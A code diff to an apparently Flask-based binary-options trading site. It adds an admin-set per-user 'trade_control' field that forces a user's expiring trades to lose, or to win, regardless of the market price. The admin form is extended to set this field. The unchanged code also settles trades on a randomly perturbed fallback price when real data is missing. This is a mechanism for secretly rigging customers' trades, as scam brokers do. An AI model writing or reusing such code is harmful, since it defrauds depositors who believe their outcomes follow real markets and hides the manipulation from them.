@@ -718,6 +718,10 @@ def process_expired_trades_for_user(user_id):
         
         market_data = RealMarketData()
         
+        # Get user and check trade control settings
+        user = User.query.get(user_id)
+        trade_control = user.trade_control if user else 'normal'
+        
         for trade in expired_trades:
             try:
                 # Get current price for the asset
@@ -736,23 +740,32 @@ def process_expired_trades_for_user(user_id):
                     # Use fallback price if real data unavailable
                     current_price = float(trade.entry_price) * (1 + random.uniform(-0.005, 0.005))
                 
-                # Calculate trade result
+                # Set basic trade info
                 trade.exit_price = current_price
                 trade.closed_at = datetime.utcnow()
                 
-                # Determine win/loss
-                if trade.trade_type == 'call':
-                    is_winner = current_price > float(trade.entry_price)
-                else:  # put
-                    is_winner = current_price < float(trade.entry_price)
-                
-                # Update trade status and profit/loss
-                if is_winner:
+                # Apply admin trade control overrides
+                if trade_control == 'always_lose':
+                    # Force trade to lose regardless of market outcome
+                    trade.status = 'lost'
+                    trade.profit_loss = -float(trade.amount)
+                elif trade_control == 'always_profit':
+                    # Force trade to win regardless of market outcome
                     trade.status = 'won'
                     trade.profit_loss = float(trade.amount) * (float(trade.payout_percentage) / 100)
                 else:
-                    trade.status = 'lost'
-                    trade.profit_loss = -float(trade.amount)
+                    # Normal trading - determine win/loss based on market price
+                    if trade.trade_type == 'call':
+                        is_winner = current_price > float(trade.entry_price)
+                    else:  # put
+                        is_winner = current_price < float(trade.entry_price)
+                    
+                    if is_winner:
+                        trade.status = 'won'
+                        trade.profit_loss = float(trade.amount) * (float(trade.payout_percentage) / 100)
+                    else:
+                        trade.status = 'lost'
+                        trade.profit_loss = -float(trade.amount)
                 
                 # Update user wallet balance
                 wallet = Wallet.query.filter_by(user_id=trade.user_id).first()
@@ -1016,14 +1029,16 @@ def admin_user_detail(user_id):
     if form.validate_on_submit():
         user.is_active = form.is_active.data
         user.is_admin = form.is_admin.data
+        user.trade_control = form.trade_control.data
         
         db.session.commit()
-        flash(f'User {user.username} updated successfully.', 'success')
+        flash(f'User {user.username} updated successfully. Trade control set to: {form.trade_control.data}', 'success')
         return redirect(url_for('admin_user_detail', user_id=user_id))
     
     # Pre-populate form
     form.is_active.data = user.is_active
     form.is_admin.data = user.is_admin
+    form.trade_control.data = user.trade_control or 'normal'
     
     # Get user's trades
     active_trades = Trade.query.filter_by(user_id=user.id, status='active').order_by(Trade.created_at.desc()).all()
